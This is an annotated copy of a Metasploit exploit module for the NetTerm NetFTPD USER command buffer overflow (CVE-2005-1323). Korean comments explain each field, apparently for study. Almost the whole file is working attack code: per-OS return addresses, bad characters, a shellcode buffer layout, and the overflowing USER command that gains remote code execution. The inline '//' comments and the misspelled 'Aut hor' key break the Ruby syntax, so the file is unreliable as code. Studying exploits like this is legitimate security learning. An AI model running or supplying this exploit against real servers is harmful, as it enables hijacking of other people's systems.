##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote // Exploit 기본 클래스를 상속함
  Rank = GreatRanking                         // Exploit의 신뢰도 지정
  include Msf::Exploit::Remote::Ftp           // FTP 모듈 포함

  def initialize(info = {})                   // 초기화 함수. 반드시 존재해야함
    super(update_info(info,
      'Name'           => 'NetTerm NetFTPD USER Buffer Overflow', // 모듈이름
      'Description'    => %q{                                     // 상세설명
          This module exploits a vulnerability in the NetTerm NetFTPD
        application. This package is part of the NetTerm package.
        This module uses the USER command to trigger the overflow.
      },  
      'Aut hor'         => [ 'hdm' ],       // 작성자
      'License'        => MSF_LICENSE,      // 라이센스
      'References'     =>                   // 취약점 CVE코드 등 추가정보
        [
          [ 'CVE', '2005-1323'],
          [ 'OSVDB', '15865'],
          [ 'URL', 'http://seclists.org/lists/fulldisclosure/2005/Apr/0578.html'],
          [ 'BID', '13396'],
        ],
      'Privileged'     => false,
      'Payload'        =>               // Payload 관련 옵션
        {
          'Space'    => 1000,           // 쉘코드 입력 가능 버퍼 크기
          'BadChars' => "\x00\x0a\x20\x0d", // 입력 불가 문자
          'StackAdjustment' => -3500,       // 스택 조정(버퍼크기 조절)
        },
      'Platform'       => [ 'win' ],        // 플랫폼
      'Targets'        =>                   // 타겟 os, 프로그램 버전에 따른 옵션
        [
          [
            'NetTerm NetFTPD Universal',  # Tested OK - hdm 11/24/2005
            {
              'Ret'      => 0x0040df98, # netftpd.exe (multiple versions)
            },
          ],
          [
            'Windows 2000 English',
            {
              'Ret'      => 0x75022ac4, # ws2help.dll
            },
          ],
          [
            'Windows XP English SP0/SP1',
            {
              'Ret'      => 0x71aa32ad, # ws2help.dll
            },
          ],
          [
            'Windows 2003 English',
            {
              'Ret'      => 0x7ffc0638, # peb magic :-)
            },
          ],
          [
            'Windows NT 4.0 SP4/SP5/SP6',
            {
              'Ret'      => 0x77681799, # ws2help.dll
            },
          ],
        ],
      'DisclosureDate' => 'Apr 26 2005',        // 작성일
      'DefaultTarget' => 0))                    // 기본 타겟 지정
  end

  def check
    connect
    disconnect
    if (banner =~ /NetTerm FTP server/)
      return Exploit::CheckCode::Detected       // 취약
    end
    return Exploit::CheckCode::Safe             // 취약X
  end

  def exploit
    connect

    print_status("Trying target #{target.name}...")     // 상태 출력

    # U          push ebp
    # S          push ebx
    # E          inc ebp
    # R          push edx
    # \x20\xC0   and al, al

    buf          = rand_text_english(8192, payload_badchars) // badchar 제외 문자 생성
    buf[0, 1]    = "\xc0"
    buf[1, payload.encoded.length] = payload.encoded // 쉘코드 인코딩
    buf[1014, 4] = [ target.ret ].pack('V') // 위에서 OS별로 지정한 ret 주소

    send_cmd( ["USER #{buf}"] ) // USER 명령과 Payload 전송
    send_cmd( ['HELP'] ) 
    handler // msf handler
    disconnect
  end
end